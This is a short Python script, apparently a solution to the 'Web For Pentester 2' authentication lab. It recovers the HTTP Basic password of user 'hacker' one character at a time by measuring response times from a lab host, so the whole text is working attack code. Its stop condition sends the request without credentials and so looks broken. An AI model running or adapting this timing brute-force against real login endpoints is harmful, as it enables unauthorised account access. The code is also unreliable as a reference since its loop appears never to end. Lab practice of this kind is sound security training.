# author: Gökmen DEMİR
# Web For Pentester 2 Authentication Exp2 için
# 1. ve 3. print satırlarını silebilirsiniz.
import requests
referansList = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
url = "http://192.168.126.130/authentication/example2/"
sinirZamani = 1.600
cennetinKapisi = [""]*62
tempString = ""
sonsuz = 1
while sonsuz:
    for s in range(0,62):
        cennetinKapisi[s] += referansList[s]
    print(cennetinKapisi)
    for i in range(0,62):
        character = requests.get(url, auth=('hacker', cennetinKapisi[i])).elapsed.total_seconds()
        if character > sinirZamani:
            print(str(cennetinKapisi[i]) + "=" + str(character))
            tempString = cennetinKapisi[i]
    for g in range(0,62):
        cennetinKapisi[g] = tempString
    print(cennetinKapisi)
    sinirZamani += 0.2
    r = requests.get(url)
    if r.ok:
        sonsuz = 0
